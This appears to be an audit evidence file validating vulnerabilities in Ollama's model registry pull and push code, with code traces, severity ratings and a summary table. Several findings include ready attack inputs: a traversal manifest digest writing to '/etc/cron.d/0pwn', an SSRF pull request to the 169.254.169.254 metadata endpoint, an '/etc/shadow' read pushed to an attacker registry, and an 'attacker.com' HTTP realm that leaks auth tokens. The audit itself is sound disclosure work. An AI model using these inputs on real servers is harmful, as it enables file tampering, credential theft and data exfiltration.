# Evidence File — Group A

## Evidence for PH-01 / PH-15 (pullWithTransfer digest path traversal)

**Verdict**: VALIDATED — CRITICAL

**Code trace**:
- `server/images.go:722-727`: `blobs[i].Digest = layer.Digest` — no `BlobsPath` call
- `x/imagegen/transfer/transfer.go:165-170`: `digestToPath` — raw string replace; no validation
- `x/imagegen/transfer/download.go:213`: `dest = filepath.Join(d.destDir, digestToPath(blob.Digest))`
- `x/imagegen/transfer/download.go:215`: `os.MkdirAll(filepath.Dir(dest), 0o755)` — creates directories
- `x/imagegen/transfer/download.go:242`: `f, err = os.Create(tmp)` — creates file
- `x/imagegen/transfer/download.go:257-259`: hash mismatch → `os.Remove(tmp)` only if `existingSize == 0 OR blob.Size < resumeThreshold`

**Persistence condition** (line 134 in download.go):
```go
if blob.Size < resumeThreshold {  // resumeThreshold = 64MB
    dest := filepath.Join(d.destDir, digestToPath(blob.Digest))
    os.Remove(dest + ".tmp")
}
```
For `blob.Size >= 64MB`: `.tmp` is NOT removed on hash mismatch. Attacker-controlled bytes at traversal path persist.

**Attack input constructed**:
```json
{
  "layers": [
    {"mediaType": "application/vnd.ollama.image.tensor", "digest": "sha256:aaaa...1111", "size": 1},
    {"mediaType": "application/vnd.ollama.image.model", "digest": "sha256:../../../etc/cron.d/0pwn", "size": 100000000}
  ]
}
```
- `hasTensorLayers` returns true (first layer is tensor)
- `pullWithTransfer` called with both layers including the traversal one
- `digestToPath("sha256:../../../etc/cron.d/0pwn")` → `"sha256-../../../etc/cron.d/0pwn"`
- `filepath.Join("/home/user/.ollama/models/blobs", "sha256-../../../etc/cron.d/0pwn")` → `/etc/cron.d/0pwn`
- `os.MkdirAll("/etc/cron.d", 0o755)` → succeeds if ollama runs as root
- `os.Create("/etc/cron.d/0pwn.tmp")` → file created with attacker bytes streamed in
- Size >= 64MB → `.tmp` NOT cleaned up → `/etc/cron.d/0pwn.tmp` persists

**Fragility**: NOT fragile — direct code path, no environmental conditions (beyond ollama having write permission to the target path, which is satisfied if running as root or non-privileged user for paths under home).

**Protection that is absent**: `manifest.BlobsPath` regex check exists at `manifest/paths.go:40` but is NOT called in this path.

---

## Evidence for PH-02 / PH-20 (size-only cache-hit)

**Verdict**: VALIDATED — HIGH

**Code trace (fast path)**:
- `x/imagegen/transfer/download.go:57-65`:
  ```go
  if fi, _ := os.Stat(filepath.Join(opts.DestDir, digestToPath(b.Digest))); fi != nil && fi.Size() == b.Size {
      alreadyCompleted += b.Size
      continue
  }
  ```
  No hash verification.

**Code trace (legacy path)**:
- `server/download.go:478-491`: `os.Stat(fp)` → `cacheHit = true` if file exists; no hash
- `server/images.go:641-653`: `skipVerify[layer.Digest] = cacheHit` → `verifyBlob` skipped for cache hits

**Fragility**: NOT fragile on fast path. The legacy path has `verifyBlob` but `skipVerify` map disables it for cache hits, making the bypass present on both paths.

---

## Evidence for PH-03 / PH-17 (SSRF via pull host)

**Verdict**: VALIDATED — HIGH

**Code trace**:
- `types/model/name.go:355-358`: `case '.'` is allowed in `kindHost` — IP addresses like `169.254.169.254` are valid
- `server/routes.go:953`: `regOpts.Insecure = req.Insecure` — caller controls HTTP via request body
- `server/images.go:615`: `if n.ProtocolScheme == "http" && !regOpts.Insecure { return errInsecureProtocol }` — bypassed when `Insecure=true`
- `server/images.go:854`: `requestURL := n.BaseURL().JoinPath("v2", ...)` — attacker-controlled host
- Error at `images.go:622`: `"pull model manifest: %s", err` — registry response body leaked in error

**Confirmed attack**: `POST /api/pull {"name":"169.254.169.254/x:latest","insecure":true}` → HTTP GET to `http://169.254.169.254/v2/x/manifests/latest` → IMDS response in error message.

**Fragility**: NOT fragile — `isValidPart` for host confirmed to allow `.`, `Insecure` flag accepted from request body.

---

## Evidence for PH-04 + PH-14 (io.ReadAll OOM double-barrel)

**Verdict**: VALIDATED — HIGH (both independently and combined)

**Code trace (manifest)**:
- `server/images.go:864`: `data, err := io.ReadAll(resp.Body)` — no `io.LimitReader`
- `resp` is from `makeRequestWithRetry(ctx, http.MethodGet, requestURL, headers, nil, regOpts)` where `requestURL` points to attacker-controlled registry

**Code trace (token)**:
- `server/auth.go:81`: `body, err := io.ReadAll(response.Body)` — no `io.LimitReader`  
- Called from `getAuthorizationToken` which is called when registry returns 401
- An attacker registry can return 401 on the manifest fetch, triggering the token endpoint fetch

**Combined flow**: One `POST /api/pull` can trigger both `io.ReadAll` calls sequentially — first the token fetch (on 401), then the manifest fetch. Either large response OOMs the server.

**Fragility**: NOT fragile — direct code path. No Go runtime protection against `io.ReadAll` of multi-GB bodies; Go allocates incrementally.

---

## Evidence for PH-08 / PH-16 (push reads traversal digest — arbitrary file read)

**Verdict**: VALIDATED — HIGH (with precondition of manifest containing traversal digest)

**Code trace**:
- `server/images.go:797-803`: `blobs[i].Digest = layer.Digest` in `pushWithTransfer` — no `BlobsPath` call
- `x/imagegen/transfer/upload.go:181`: `os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))`
- If `blob.Digest = "sha256:../../../etc/shadow"` → `os.Open("/etc/shadow")`
- Contents sent via HTTP PUT to attacker's registry

**Precondition**: Manifest with traversal digest must exist at `$OLLAMA_MODELS/manifests/`. This manifest is written by `pullWithTransfer` at `images.go:787` — the raw `manifestData` from the registry is stored verbatim, including traversal digests.

**Fragility**: CONDITIONALLY fragile — requires a prior pull from the malicious registry to plant the manifest, then a push of the same model name.

---

## Evidence for PH-09 / PH-19 (realm HTTP downgrade — auth token over plaintext)

**Verdict**: VALIDATED — HIGH

**Code trace**:
- `server/auth.go:53-61`:
  ```go
  func getAuthorizationToken(ctx context.Context, challenge registryChallenge, originalHost string) (string, error) {
      redirectURL, err := challenge.URL()
      if redirectURL.Host != originalHost {
          return "", fmt.Errorf("realm host %q does not match original host %q", ...)
      }
  ```
  Host check present. Scheme check ABSENT.

- `server/auth.go:75`: `makeRequest(ctx, http.MethodGet, redirectURL, headers, nil, &registryOptions{})` — `regOpts` is empty struct; `Insecure=false`.
- `server/images.go:952`: `if requestURL.Scheme != "http" && regOpts != nil && regOpts.Insecure { requestURL.Scheme = "http" }` — this line forces HTTP only when `Insecure=true`. When scheme is ALREADY `"http"` (from the realm URL), no check prevents the HTTP request.
- The `Authorization` header containing `auth.Sign(ctx, data)` (ed25519 signature) is sent to `http://` URL.

**Attack**: Attacker controls the registry (`attacker.com`). Registry responds with `WWW-Authenticate: Bearer realm="http://attacker.com/token",service="attacker.com",scope="..."`. Host `attacker.com == attacker.com` → check passes. Token endpoint called over HTTP. MITM reads signed auth token.

**Fragility**: CONDITIONALLY fragile — requires MITM or attacker-controlled DNS for the registry host. If the registry uses TLS everywhere, this is a moot bypass. But DNS+HTTP registries are common in enterprise/private registries and in `Insecure=true` deployments.

---

## Evidence for PH-05 + PH-06 (Content-Range not validated; slow-retry race)

**Verdict**: PH-05 VALIDATED (MEDIUM-HIGH); PH-06 CONDITIONALLY VALIDATED (HIGH, constrained)

**PH-05 Code trace**:
- `server/download.go:338`: `req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", part.StartsAt(), part.StopsAt()-1))`
- `server/download.go:339-351`: `resp, err := http.DefaultClient.Do(req)` → `io.CopyN(w, ...)` — no `resp.StatusCode` check, no `Content-Range` header validation
- A server returning 200 with full body will write first `part.Size` bytes into each part's slot

**PH-06 Code trace**:
- `server/download.go:284-306`: inner goroutine loop with `errPartStalled` retry and exponential backoff for other errors
- The `errgroup.WithContext` context cancellation propagates to HTTP reads; stray writes after cancellation are possible but require a tight race
- `server/download.go:309-327`: `g.Wait()` then `file.Close()` then `os.Rename` — stray write after rename would corrupt the final blob

**Fragility for PH-06**: Fragile — requires attacker-controlled origin + goroutine-cancellation race win. Attacker must be able to deliver bytes that arrive after the hasher reads but before or after the rename. Not deterministically exploitable.

---

## Evidence for PH-12 (HTTPS-to-HTTP redirect)

**Verdict**: VALIDATED — HIGH (scheme integrity broken; hash still detects content corruption)

**Code trace**:
- `server/download.go:240-253`: `CheckRedirect` returns `http.ErrUseLastResponse` for off-host redirects
- `server/download.go:265-269`: `return resp.Location()` — returns the Location URL; this can be `http://`
- `server/download.go:287-288`: `directURL` used in all subsequent `downloadChunk` calls with no scheme re-check
- Net impact: blob bytes arrive over HTTP; MITM on plaintext can inject bytes; streaming hash catches mismatch but `.tmp` persists (denial of service, not silent compromise)

**Fragility**: NOT fragile for DoS — any MITM on the CDN path can trigger hash mismatch loop. Silent compromise requires a sha256 collision (not feasible). Impact is persistent partial-file DoS.

---

## Summary Verdicts by PH

| PH | Title | Verdict | Severity | Fragility |
|----|-------|---------|----------|-----------|
| PH-01/15 | pullWithTransfer path traversal | VALIDATED | CRITICAL | Not fragile |
| PH-02/20 | Size-only cache-hit bypass | VALIDATED | HIGH | Not fragile |
| PH-03/17 | SSRF via pull host | VALIDATED | HIGH | Not fragile |
| PH-04 | Manifest io.ReadAll OOM | VALIDATED | HIGH | Not fragile |
| PH-05 | HTTP 206 Content-Range not validated (DoS) | VALIDATED | MEDIUM-HIGH | Not fragile |
| PH-06 | Slow-retry goroutine race | CONDITIONALLY VALIDATED | HIGH | Fragile (race) |
| PH-07 | fixBlobs symlink rename | NEEDS DEEPER | MEDIUM | Fragile (prior write access) |
| PH-08/16 | Push reads traversal digest → file read | VALIDATED | HIGH | Conditional (manifest precondition) |
| PH-09/19 | Realm HTTP downgrade → token over plaintext | VALIDATED | HIGH | Conditional (MITM required) |
| PH-10 | Zero-size blob → empty file creation | VALIDATED | MEDIUM | Not fragile |
| PH-11 | handlePull no body size limit (client2) | VALIDATED | MEDIUM | Not fragile |
| PH-12 | HTTPS-to-HTTP CDN redirect (persistent DoS) | VALIDATED | HIGH (DoS) | Not fragile for DoS |
| PH-13 | imagegen BlobPath traversal propagation | NEEDS DEEPER | HIGH | Conditional |
| PH-14 | Token io.ReadAll OOM | VALIDATED | HIGH | Not fragile |
| PH-18 | Double io.ReadAll (combined) | VALIDATED | HIGH | Not fragile |
